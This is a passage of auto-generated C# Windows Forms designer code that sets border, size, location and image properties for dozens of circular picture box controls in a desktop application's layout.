            this.rjCircularPictureBox44.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox44.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox44.BorderSize = 2;
            this.rjCircularPictureBox44.GradientAngle = 50f;
            this.rjCircularPictureBox44.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox44.Image");
            this.rjCircularPictureBox44.Location = new System.Drawing.Point(400, 607);
            this.rjCircularPictureBox44.Name = "rjCircularPictureBox44";
            this.rjCircularPictureBox44.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox44.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox44.TabIndex = 322;
            this.rjCircularPictureBox44.TabStop = false;
            this.rjCircularPictureBox46.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox46.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox46.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox46.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox46.BorderSize = 2;
            this.rjCircularPictureBox46.GradientAngle = 50f;
            this.rjCircularPictureBox46.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox46.Image");
            this.rjCircularPictureBox46.Location = new System.Drawing.Point(61, 607);
            this.rjCircularPictureBox46.Name = "rjCircularPictureBox46";
            this.rjCircularPictureBox46.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox46.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox46.TabIndex = 320;
            this.rjCircularPictureBox46.TabStop = false;
            this.rjCircularPictureBox37.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox37.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox37.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox37.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox37.BorderSize = 2;
            this.rjCircularPictureBox37.GradientAngle = 50f;
            this.rjCircularPictureBox37.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox37.Image");
            this.rjCircularPictureBox37.Location = new System.Drawing.Point(744, 544);
            this.rjCircularPictureBox37.Name = "rjCircularPictureBox37";
            this.rjCircularPictureBox37.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox37.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox37.TabIndex = 309;
            this.rjCircularPictureBox37.TabStop = false;
            this.rjCircularPictureBox38.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox38.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox38.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox38.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox38.BorderSize = 2;
            this.rjCircularPictureBox38.GradientAngle = 50f;
            this.rjCircularPictureBox38.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox38.Image");
            this.rjCircularPictureBox38.Location = new System.Drawing.Point(208, 544);
            this.rjCircularPictureBox38.Name = "rjCircularPictureBox38";
            this.rjCircularPictureBox38.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox38.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox38.TabIndex = 308;
            this.rjCircularPictureBox38.TabStop = false;
            this.rjCircularPictureBox39.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox39.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox39.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox39.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox39.BorderSize = 2;
            this.rjCircularPictureBox39.GradientAngle = 50f;
            this.rjCircularPictureBox39.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox39.Image");
            this.rjCircularPictureBox39.Location = new System.Drawing.Point(400, 544);
            this.rjCircularPictureBox39.Name = "rjCircularPictureBox39";
            this.rjCircularPictureBox39.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox39.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox39.TabIndex = 307;
            this.rjCircularPictureBox39.TabStop = false;
            this.rjCircularPictureBox40.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox40.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox40.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox40.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox40.BorderSize = 2;
            this.rjCircularPictureBox40.GradientAngle = 50f;
            this.rjCircularPictureBox40.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox40.Image");
            this.rjCircularPictureBox40.Location = new System.Drawing.Point(571, 544);
            this.rjCircularPictureBox40.Name = "rjCircularPictureBox40";
            this.rjCircularPictureBox40.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox40.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox40.TabIndex = 306;
            this.rjCircularPictureBox40.TabStop = false;
            this.rjCircularPictureBox41.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox41.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox41.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox41.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox41.BorderSize = 2;
            this.rjCircularPictureBox41.GradientAngle = 50f;
            this.rjCircularPictureBox41.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox41.Image");
            this.rjCircularPictureBox41.Location = new System.Drawing.Point(61, 544);
            this.rjCircularPictureBox41.Name = "rjCircularPictureBox41";
            this.rjCircularPictureBox41.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox41.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox41.TabIndex = 305;
            this.rjCircularPictureBox41.TabStop = false;
            this.rjCircularPictureBox1.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox1.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox1.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox1.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox1.BorderSize = 2;
            this.rjCircularPictureBox1.GradientAngle = 50f;
            this.rjCircularPictureBox1.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox1.Image");
            this.rjCircularPictureBox1.Location = new System.Drawing.Point(913, 258);
            this.rjCircularPictureBox1.Name = "rjCircularPictureBox1";
            this.rjCircularPictureBox1.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox1.TabIndex = 212;
            this.rjCircularPictureBox1.TabStop = false;
            this.rjCircularPictureBox2.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox2.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox2.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox2.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox2.BorderSize = 2;
            this.rjCircularPictureBox2.GradientAngle = 50f;
            this.rjCircularPictureBox2.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox2.Image");
            this.rjCircularPictureBox2.Location = new System.Drawing.Point(61, 385);
            this.rjCircularPictureBox2.Name = "rjCircularPictureBox2";
            this.rjCircularPictureBox2.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox2.TabIndex = 213;
            this.rjCircularPictureBox2.TabStop = false;
            this.rjCircularPictureBox3.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox3.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox3.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox3.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox3.BorderSize = 2;
            this.rjCircularPictureBox3.GradientAngle = 50f;
            this.rjCircularPictureBox3.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox3.Image");
            this.rjCircularPictureBox3.Location = new System.Drawing.Point(570, 321);
            this.rjCircularPictureBox3.Name = "rjCircularPictureBox3";
            this.rjCircularPictureBox3.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox3.TabIndex = 214;
            this.rjCircularPictureBox3.TabStop = false;
            this.rjCircularPictureBox4.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox4.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox4.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox4.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox4.BorderSize = 2;
            this.rjCircularPictureBox4.GradientAngle = 50f;
            this.rjCircularPictureBox4.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox4.Image");
            this.rjCircularPictureBox4.Location = new System.Drawing.Point(206, 48);
            this.rjCircularPictureBox4.Name = "rjCircularPictureBox4";
            this.rjCircularPictureBox4.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox4.TabIndex = 215;
            this.rjCircularPictureBox4.TabStop = false;
            this.rjCircularPictureBox5.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox5.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox5.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox5.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox5.BorderSize = 4;
            this.rjCircularPictureBox5.GradientAngle = 50f;
            this.rjCircularPictureBox5.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox5.Image");
            this.rjCircularPictureBox5.Location = new System.Drawing.Point(59, 48);
            this.rjCircularPictureBox5.Name = "rjCircularPictureBox5";
            this.rjCircularPictureBox5.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox5.TabIndex = 216;
            this.rjCircularPictureBox5.TabStop = false;
            this.rjCircularPictureBox7.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox7.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox7.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox7.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox7.BorderSize = 2;
            this.rjCircularPictureBox7.GradientAngle = 50f;
            this.rjCircularPictureBox7.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox7.Image");
            this.rjCircularPictureBox7.Location = new System.Drawing.Point(569, 107);
            this.rjCircularPictureBox7.Name = "rjCircularPictureBox7";
            this.rjCircularPictureBox7.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox7.TabIndex = 218;
            this.rjCircularPictureBox7.TabStop = false;
            this.rjCircularPictureBox6.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox6.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox6.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox6.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox6.BorderSize = 2;
            this.rjCircularPictureBox6.GradientAngle = 50f;
            this.rjCircularPictureBox6.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox6.Image");
            this.rjCircularPictureBox6.Location = new System.Drawing.Point(61, 258);
            this.rjCircularPictureBox6.Name = "rjCircularPictureBox6";
            this.rjCircularPictureBox6.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox6.TabIndex = 219;
            this.rjCircularPictureBox6.TabStop = false;
            this.rjCircularPictureBox8.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox8.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox8.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox8.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox8.BorderSize = 2;
            this.rjCircularPictureBox8.GradientAngle = 50f;
            this.rjCircularPictureBox8.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox8.Image");
            this.rjCircularPictureBox8.Location = new System.Drawing.Point(59, 163);
            this.rjCircularPictureBox8.Name = "rjCircularPictureBox8";
            this.rjCircularPictureBox8.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox8.TabIndex = 287;
            this.rjCircularPictureBox8.TabStop = false;
            this.rjCircularPictureBox11.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox11.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox11.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox11.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox11.BorderSize = 2;
            this.rjCircularPictureBox11.GradientAngle = 50f;
            this.rjCircularPictureBox11.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox11.Image");
            this.rjCircularPictureBox11.Location = new System.Drawing.Point(61, 447);
            this.rjCircularPictureBox11.Name = "rjCircularPictureBox11";
            this.rjCircularPictureBox11.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox11.TabIndex = 220;
            this.rjCircularPictureBox11.TabStop = false;
            this.rjCircularPictureBox32.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox32.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox32.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox32.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox32.BorderSize = 2;
            this.rjCircularPictureBox32.GradientAngle = 50f;
            this.rjCircularPictureBox32.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox32.Image");
            this.rjCircularPictureBox32.Location = new System.Drawing.Point(206, 107);
            this.rjCircularPictureBox32.Name = "rjCircularPictureBox32";
            this.rjCircularPictureBox32.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox32.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox32.TabIndex = 286;
            this.rjCircularPictureBox32.TabStop = false;
            this.rjCircularPictureBox10.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox10.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox10.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox10.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox10.BorderSize = 2;
            this.rjCircularPictureBox10.GradientAngle = 50f;
            this.rjCircularPictureBox10.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox10.Image");
            this.rjCircularPictureBox10.Location = new System.Drawing.Point(400, 258);
            this.rjCircularPictureBox10.Name = "rjCircularPictureBox10";
            this.rjCircularPictureBox10.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox10.TabIndex = 221;
            this.rjCircularPictureBox10.TabStop = false;
            this.rjCircularPictureBox33.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox33.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox33.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox33.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox33.BorderSize = 2;
            this.rjCircularPictureBox33.GradientAngle = 50f;
            this.rjCircularPictureBox33.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox33.Image");
            this.rjCircularPictureBox33.Location = new System.Drawing.Point(400, 107);
            this.rjCircularPictureBox33.Name = "rjCircularPictureBox33";
            this.rjCircularPictureBox33.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox33.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox33.TabIndex = 285;
            this.rjCircularPictureBox33.TabStop = false;
            this.rjCircularPictureBox9.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox9.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox9.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox9.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox9.BorderSize = 2;
            this.rjCircularPictureBox9.GradientAngle = 50f;
            this.rjCircularPictureBox9.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox9.Image");
            this.rjCircularPictureBox9.Location = new System.Drawing.Point(208, 385);
            this.rjCircularPictureBox9.Name = "rjCircularPictureBox9";
            this.rjCircularPictureBox9.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox9.TabIndex = 222;
            this.rjCircularPictureBox9.TabStop = false;
            this.rjCircularPictureBox34.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox34.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox34.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox34.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox34.BorderSize = 2;
            this.rjCircularPictureBox34.GradientAngle = 50f;
            this.rjCircularPictureBox34.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox34.Image");
            this.rjCircularPictureBox34.Location = new System.Drawing.Point(741, 107);
            this.rjCircularPictureBox34.Name = "rjCircularPictureBox34";
            this.rjCircularPictureBox34.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox34.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox34.TabIndex = 284;
            this.rjCircularPictureBox34.TabStop = false;
            this.rjCircularPictureBox12.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox12.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox12.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox12.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox12.BorderSize = 2;
            this.rjCircularPictureBox12.GradientAngle = 50f;
            this.rjCircularPictureBox12.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox12.Image");
            this.rjCircularPictureBox12.Location = new System.Drawing.Point(570, 447);
            this.rjCircularPictureBox12.Name = "rjCircularPictureBox12";
            this.rjCircularPictureBox12.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox12.TabIndex = 223;
            this.rjCircularPictureBox12.TabStop = false;
            this.rjCircularPictureBox35.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox35.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox35.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox35.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox35.BorderSize = 2;
            this.rjCircularPictureBox35.GradientAngle = 50f;
            this.rjCircularPictureBox35.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox35.Image");
            this.rjCircularPictureBox35.Location = new System.Drawing.Point(59, 107);
            this.rjCircularPictureBox35.Name = "rjCircularPictureBox35";
            this.rjCircularPictureBox35.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox35.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox35.TabIndex = 283;
            this.rjCircularPictureBox35.TabStop = false;
            this.rjCircularPictureBox13.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox13.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox13.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox13.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox13.BorderSize = 2;
            this.rjCircularPictureBox13.GradientAngle = 50f;
            this.rjCircularPictureBox13.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox13.Image");
            this.rjCircularPictureBox13.Location = new System.Drawing.Point(911, 48);
            this.rjCircularPictureBox13.Name = "rjCircularPictureBox13";
            this.rjCircularPictureBox13.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox13.TabIndex = 224;
            this.rjCircularPictureBox13.TabStop = false;
            this.rjCircularPictureBox36.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox36.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox36.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox36.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox36.BorderSize = 2;
            this.rjCircularPictureBox36.GradientAngle = 50f;
            this.rjCircularPictureBox36.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox36.Image");
            this.rjCircularPictureBox36.Location = new System.Drawing.Point(911, 107);
            this.rjCircularPictureBox36.Name = "rjCircularPictureBox36";
            this.rjCircularPictureBox36.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox36.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox36.TabIndex = 282;
            this.rjCircularPictureBox36.TabStop = false;
            this.rjCircularPictureBox14.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox14.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox14.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox14.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox14.BorderSize = 2;
            this.rjCircularPictureBox14.GradientAngle = 50f;
            this.rjCircularPictureBox14.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox14.Image");
            this.rjCircularPictureBox14.Location = new System.Drawing.Point(61, 321);
            this.rjCircularPictureBox14.Name = "rjCircularPictureBox14";
            this.rjCircularPictureBox14.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox14.TabIndex = 225;
            this.rjCircularPictureBox14.TabStop = false;
            this.rjCircularPictureBox15.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox15.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox15.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox15.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox15.BorderSize = 2;
            this.rjCircularPictureBox15.GradientAngle = 50f;
            this.rjCircularPictureBox15.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox15.Image");
            this.rjCircularPictureBox15.Location = new System.Drawing.Point(568, 48);
            this.rjCircularPictureBox15.Name = "rjCircularPictureBox15";
            this.rjCircularPictureBox15.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox15.TabIndex = 226;
            this.rjCircularPictureBox15.TabStop = false;
            this.rjCircularPictureBox16.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox16.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox16.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox16.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox16.BorderSize = 2;
            this.rjCircularPictureBox16.GradientAngle = 50f;
            this.rjCircularPictureBox16.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox16.Image");
            this.rjCircularPictureBox16.Location = new System.Drawing.Point(741, 48);
            this.rjCircularPictureBox16.Name = "rjCircularPictureBox16";
            this.rjCircularPictureBox16.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox16.TabIndex = 227;
            this.rjCircularPictureBox16.TabStop = false;
            this.rjCircularPictureBox17.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox17.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox17.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox17.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox17.BorderSize = 2;
            this.rjCircularPictureBox17.GradientAngle = 50f;
            this.rjCircularPictureBox17.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox17.Image");
            this.rjCircularPictureBox17.Location = new System.Drawing.Point(400, 321);
            this.rjCircularPictureBox17.Name = "rjCircularPictureBox17";
            this.rjCircularPictureBox17.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox17.TabIndex = 228;
            this.rjCircularPictureBox17.TabStop = false;
            this.rjCircularPictureBox18.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox18.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox18.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox18.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox18.BorderSize = 2;
            this.rjCircularPictureBox18.GradientAngle = 50f;
            this.rjCircularPictureBox18.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox18.Image");
            this.rjCircularPictureBox18.Location = new System.Drawing.Point(400, 447);
            this.rjCircularPictureBox18.Name = "rjCircularPictureBox18";
            this.rjCircularPictureBox18.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox18.TabIndex = 229;
            this.rjCircularPictureBox18.TabStop = false;
            this.rjCircularPictureBox19.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox19.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox19.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox19.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox19.BorderSize = 2;
            this.rjCircularPictureBox19.GradientAngle = 50f;
            this.rjCircularPictureBox19.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox19.Image");
            this.rjCircularPictureBox19.Location = new System.Drawing.Point(208, 258);
            this.rjCircularPictureBox19.Name = "rjCircularPictureBox19";
            this.rjCircularPictureBox19.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox19.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox19.TabIndex = 230;
            this.rjCircularPictureBox19.TabStop = false;
            this.rjCircularPictureBox20.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox20.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
